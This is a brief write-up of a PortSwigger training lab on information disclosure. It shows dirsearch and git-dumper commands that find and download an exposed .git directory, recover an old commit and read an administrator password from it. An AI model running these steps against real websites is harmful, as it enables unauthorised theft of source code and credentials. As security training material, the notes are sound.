## Approach

Access the website for /**.git** or use ***dirsearch***
## Labs
### [1. Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)

> [!NOTE]
> Find **.git** in website, dump it using ***git-dumper***, check for old version, there will be admin's password in the file, login as **administrator** with the password and **delete carlos**

 1. Since **Burp's Engagement tool** can't find **.git**, we use ***dirsearch*** to find **/.git**

```zsh
dirsearch -u "https://[LAB_URL]/" -o dirsearch.txt
```

2. Use ***git-dumper*** tool

```zsh
# Install git-dumper
pip install git-dumper

# Dump git folder
git-dumper https://[LAB_URL]/.git ./web1

# Check old git versions / commits
git log

# Set to specfic versions / commits
git checkout [COMMIT_ID]
```

3. Get **admin password** from **admin.conf**